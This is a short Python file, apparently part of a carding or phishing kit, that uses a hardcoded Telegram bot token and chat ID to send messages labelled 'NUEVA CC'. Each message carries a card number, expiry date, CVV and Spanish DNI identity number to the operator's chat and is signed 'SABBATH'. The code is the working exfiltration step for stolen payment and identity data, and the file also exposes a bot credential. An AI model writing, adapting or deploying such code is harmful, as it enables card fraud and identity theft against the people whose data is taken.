import telebot

TOKEN = '8557374921:AAEl5Hk2cgfTUzStfYGB21dOh03u9rERIyo'
CHAT_ID = "-5243465768"
bot = telebot.TeleBot(TOKEN)

def enviar_telegram(numcc, exp, cvv, dni):
    mensaje = (
        f"📊 NUEVA CC\n\n"
        f"Tarjeta: {numcc}\n"
        f"MM/AA: {exp}\n"
        f"CCV: {cvv}\n\n"
        f"DNI: {dni}\n\n"
        f"<--SABBATH-->"
    )
    bot.send_message(CHAT_ID, mensaje)
